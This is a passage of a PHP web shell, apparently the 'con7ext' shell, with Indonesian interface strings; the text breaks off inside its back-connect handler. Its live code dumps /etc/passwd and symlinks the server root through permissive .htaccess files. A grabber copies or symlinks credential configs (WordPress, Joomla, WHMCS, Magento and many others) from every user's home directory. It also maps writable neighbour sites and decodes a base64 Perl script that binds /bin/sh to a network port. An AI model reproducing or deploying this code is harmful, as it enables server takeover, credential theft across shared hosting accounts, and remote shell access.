    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['kill'] == 'self') {
	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
		else
			echo '<center>unlink failed!</center>';
}
elseif($_GET['symlink'] == 'server') {
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$d0mains = @file("/etc/named.conf");
##httaces
if($d0mains){
@mkdir("con7ext_sym",0777);
@chdir("con7ext_sym");
@exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
$fp3 = fopen('.htaccess','w');
$fw3 = fwrite($fp3,$file3);@fclose($fp3);
echo "<br>
<table align=center border=1 style='width:60%;border-color:#333333;'>
<tr>
<td align=center><font size=2>S. No.</font></td>
<td align=center><font size=2>Domains</font></td>
<td align=center><font size=2>Users</font></td>
<td align=center><font size=2>Symlink</font></td>
</tr>";
$dcount = 1;
foreach($d0mains as $d0main){
if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
<td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
<td>".$user['name']."</td>
<td><a href='$full/con7ext_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
flush();
$dcount++;}}}
echo "</table>";
}else{
$TEST=@file('/etc/passwd');
if ($TEST){
@mkdir("con7ext_sym",0777);
@chdir("con7ext_sym");
exe("ln -s / root");
$file3 = 'Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);
 @fclose($fp3);
 echo "
 <table align=center border=1><tr>
 <td align=center><font size=3>S. No.</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $dcount = 1;
 $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
 while(!feof($file)){
 $s = fgets($file);
 $matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
 $matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/con7ext_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}fclose($file);
 echo "</table>";}else{if($os != "Windows"){@mkdir("con7ext_sym",0777);@chdir("con7ext_sym");@exe("ln -s / root");$file3 = '
 Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php
AddHandler text/plain .php
Satisfy Any
';
 $fp3 = fopen('.htaccess','w');
 $fw3 = fwrite($fp3,$file3);@fclose($fp3);
 echo "
 <div class='mybox'><h2 class='k2ll33d2'>server symlinker</h2>
 <table align=center border=1><tr>
 <td align=center><font size=3>ID</font></td>
 <td align=center><font size=3>Users</font></td>
 <td align=center><font size=3>Symlink</font></td></tr>";
 $temp = "";$val1 = 0;$val2 = 1000;
 for(;$val1 <= $val2;$val1++) {$uid = @posix_getpwuid($val1);
 if ($uid)$temp .= join(':',$uid)."\n";}
 echo '<br/>';$temp = trim($temp);$file5 =
 fopen("test.txt","w");
 fputs($file5,$temp);
 fclose($file5);$dcount = 1;$file =
 fopen("test.txt", "r") or exit("Unable to open file!");
 while(!feof($file)){$s = fgets($file);$matches = array();
 $t = preg_match('/\/(.*?)\:\//s', $s, $matches);$matches = str_replace("home/","",$matches[1]);
 if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
 continue;
 echo "<tr><td align=center><font size=2>" . $dcount . "</td>
 <td align=center><font class=txt>" . $matches . "</td>";
 echo "<td align=center><font class=txt><a href=$full/con7ext_sym/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
 $dcount++;}
 fclose($file);
 echo "</table></div></center>";unlink("test.txt");
 } else
 echo "<center><font size=3>Cannot create Symlink</font></center>";
 }
 }
} elseif($_GET['config'] == 'grabber') {
			if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
exit;
}
	if($_POST){	if($_POST['config'] == 'symvhosts') {
		@mkdir("con7ext_symvhosts", 0777);
exe("ln -s / con7ext_symvhosts/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("con7ext_symvhosts/.htaccess",$htaccess);
		$etc_passwd=$_POST['passwd'];
    
    $etc_passwd=explode("\n",$etc_passwd);
foreach($etc_passwd as $passwd){
$pawd=explode(":",$passwd);
$user =$pawd[5];
$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
if (preg_match('/vhosts/i',$user)){
exe("ln -s ".$user."/httpdocs/wp-config.php con7ext_symvhosts/".$jembod."-Wordpress.txt");
exe("ln -s ".$user."/httpdocs/configuration.php con7ext_symvhosts/".$jembod."-Joomla.txt");
exe("ln -s ".$user."/httpdocs/config/koneksi.php con7ext_symvhosts/".$jembod."-Lokomedia.txt");
exe("ln -s ".$user."/httpdocs/forum/config.php con7ext_symvhosts/".$jembod."-phpBB.txt");
exe("ln -s ".$user."/httpdocs/sites/default/settings.php con7ext_symvhosts/".$jembod."-Drupal.txt");
exe("ln -s ".$user."/httpdocs/config/settings.inc.php con7ext_symvhosts/".$jembod."-PrestaShop.txt");
exe("ln -s ".$user."/httpdocs/app/etc/local.xml con7ext_symvhosts/".$jembod."-Magento.txt");
exe("ln -s ".$user."/httpdocs/admin/config.php con7ext_symvhosts/".$jembod."-OpenCart.txt");
exe("ln -s ".$user."/httpdocs/application/config/database.php con7ext_symvhosts/".$jembod."-Ellislab.txt"); 
}}}
if($_POST['config'] == 'symlink') {
@mkdir("con7ext_symconfig", 0777);
@symlink("/","con7ext_symconfig/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any";
@file_put_contents("con7ext_symconfig/.htaccess",$htaccess);}
if($_POST['config'] == '404') {
@mkdir("con7ext_sym404", 0777);
@symlink("/","con7ext_sym404/root");
$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
AddType text/plain .php 
AddHandler text/plain .php
Satisfy Any
IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
IndexIgnore *.txt404
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} ^.*con7ext_sym404 [NC]
RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
@file_put_contents("con7ext_sym404/.htaccess",$htaccess);
}
if($_POST['config'] == 'grab') {
						mkdir("con7ext_configgrab", 0777);
						$isi_htc = "Options all\nRequire None\nSatisfy Any";
						$htc = fopen("con7ext_configgrab/.htaccess","w");
						fwrite($htc, $isi_htc);	
}
$passwd = $_POST['passwd'];

preg_match_all('/(.*?):x:/', $passwd, $user_config);
foreach($user_config[1] as $user_con7ext) {
$grab_config = array(
"/home/$user_con7ext/.accesshash" => "WHM-accesshash",
"/home/$user_con7ext/public_html/config/koneksi.php" => "Lokomedia",
"/home/$user_con7ext/public_html/forum/config.php" => "phpBB",
"/home/$user_con7ext/public_html/sites/default/settings.php" => "Drupal",
"/home/$user_con7ext/public_html/config/settings.inc.php" => "PrestaShop",
"/home/$user_con7ext/public_html/app/etc/local.xml" => "Magento",
"/home/$user_con7ext/public_html/admin/config.php" => "OpenCart",
"/home/$user_con7ext/public_html/application/config/database.php" => "Ellislab",
"/home/$user_con7ext/public_html/vb/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forum/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/forums/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/cc/includes/config.php" => "Vbulletin",
"/home/$user_con7ext/public_html/inc/config.php" => "MyBB",
"/home/$user_con7ext/public_html/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/shop/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/os/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/oscom/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/products/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/cart/includes/configure.php" => "OsCommerce",
"/home/$user_con7ext/public_html/inc/conf_global.php" => "IPB",
"/home/$user_con7ext/public_html/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blog/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/beta/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/portal/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/site/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wp/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/WP/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/news/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/wordpress/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/test/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/demo/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/home/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v1/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/v2/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/press/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/new/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/blogs/wp-config.php" => "Wordpress",
"/home/$user_con7ext/public_html/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/blog/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/submitticket.php" => "^WHMCS",
"/home/$user_con7ext/public_html/cms/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/beta/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/portal/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/site/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/main/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/home/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/demo/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/test/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v1/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/v2/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/joomla/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/new/configuration.php" => "Joomla",
"/home/$user_con7ext/public_html/WHMCS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs1/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHMC/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whmc/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/WHM/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOST/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/host/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORTES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/supportes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domains/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/domain/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/HOSTING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/hosting/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CART/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cart/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ORDER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/client/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientarea/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLING/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billing/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BUY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/buy/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MANAGE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/manage/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ClientSupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientsupport/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CHECKOUT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/checkout/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
);  

foreach($grab_config as $config => $nama_config) {
	if($_POST['config'] == 'grab') {
$ambil_config = file_get_contents($config);
if($ambil_config == '') {
} else {
$file_config = fopen("con7ext_configgrab/$user_con7ext-$nama_config.txt","w");
fputs($file_config,$ambil_config);
}
}
if($_POST['config'] == 'symlink') {
@symlink($config,"con7ext_Symconfig/".$user_con7ext."-".$nama_config.".txt");
}
if($_POST['config'] == '404') {
$sym404=symlink($config,"con7ext_sym404/".$user_con7ext."-".$nama_config.".txt");
if($sym404){
	@mkdir("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404", 0777);
	$htaccess="Options Indexes FollowSymLinks
DirectoryIndex con7ext.htm
HeaderName con7ext.txt
Satisfy Any
IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
IndexIgnore *";

@file_put_contents("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/.htaccess",$htaccess);

@symlink($config,"con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/con7ext.txt");

	}

}

                    }     
		}  if($_POST['config'] == 'grab') {
            echo "<center><a href='?path=$path/con7ext_configgrab'><font color=lime>Done</font></a></center>";
		}
    if($_POST['config'] == '404') {
        echo "<center>
<a href=\"con7ext_sym404/root/\">SymlinkNya</a>
<br><a href=\"con7ext_sym404/\">Configurations</a></center>";
    }
     if($_POST['config'] == 'symlink') {
echo "<center>
<a href=\"con7ext_symconfig/root/\">Symlinknya</a>
<br><a href=\"con7ext_symconfig/\">Configurations</a></center>";
			}if($_POST['config'] == 'symvhost') {
echo "<center>
<a href=\"con7ext_symvhost/root/\">Root Server</a>
<br><a href=\"con7ext_symvhost/\">Configurations</a></center>";
			}
		
		
		}else{
        echo "<form method=\"post\" action=\"\"><center>
		</center></select><br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
        echo include("/etc/passwd"); 
        echo "</textarea><br><br>
        <select class=\"select\" name=\"config\"  style=\"width: 450px;\" height=\"10\">
        <option value=\"grab\">Config Grab</option>
        <option value=\"symlink\">Symlink Config</option>
		<option value=\"404\">Config 404</option>
		<option value=\"symvhosts\">Vhosts Config Grabber</option><br><br><input type=\"submit\" value=\"Start!!\"></td></tr></center>\n";
}
} elseif($_GET['jancok'] == 'jumping') {
	$i = 0;
	echo "<pre><div class='margin: 5px auto;'>";
	$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
	while($passwd = fgets($etc)) {
		if($passwd == '' || !$etc) {
			echo "<font color=red>Can't read /etc/passwd</font>";
		} else {
			preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
			foreach($user_jumping[1] as $user_con7ext_jump) {
				$user_jumping_dir = "/home/$user_con7ext_jump/public_html";
				if(is_readable($user_jumping_dir)) {
					$i++;
					$jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					if(is_writable($user_jumping_dir)) {
						$jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
					}
					echo $jrw;
					if(function_exists('posix_getpwuid')) {
						$domain_jump = file_get_contents("/etc/named.conf");	
						if($domain_jump == '') {
							echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
						} else {
							preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
							foreach($domains_jump[1] as $dj) {
								$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
								$user_jumping_url = $user_jumping_url['name'];
								if($user_jumping_url == $user_con7ext_jump) {
									echo " => ( <u>$dj</u> )<br>";
									break;
								}
							}
						}
					} else {
						echo "<br>";
					}
				}
			}
		}
	}
	if($i == 0) { 
	} else {
		echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
	}
	echo "</div></pre>";
} elseif($_GET['backconnect'] == 'tool'){
echo "<br><br><center><form method=post>
<br>	<span>Bind port to /bin/sh [Perl]</span><br/>
	Port: <input type='text' name='port' value='443'> <input type=submit name=bpl value='>>'>
<br><br>
		<span>Back-connect</span><br/>
	Server: <input type='text' name='server' placeholder='". $_SERVER['REMOTE_ADDR'] ."'> Port: <input type='text' name='port' placeholder='443'><select class='select' name='backconnect'  style='width: 100px;' height='10'><option value='perl'>Perl</option><option value='php'>PHP</option><option value='python'>Python</option><option value='ruby'>Ruby</option></select>
   <input type=submit value='>>'>";
	if($_POST['bpl']) {
	$bp=base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
	$brt=@fopen('bp.pl','w');
fwrite($brt,$bp);
$out = exe("perl bp.pl ".$_POST['port']." 1>/dev/null 2>&1 &");
sleep(1);
echo "<pre>$out\n".exe("ps aux | grep bp.pl")."</pre>";
unlink("bp.pl");
		}
		if($_POST['backconnect'] == 'perl') {
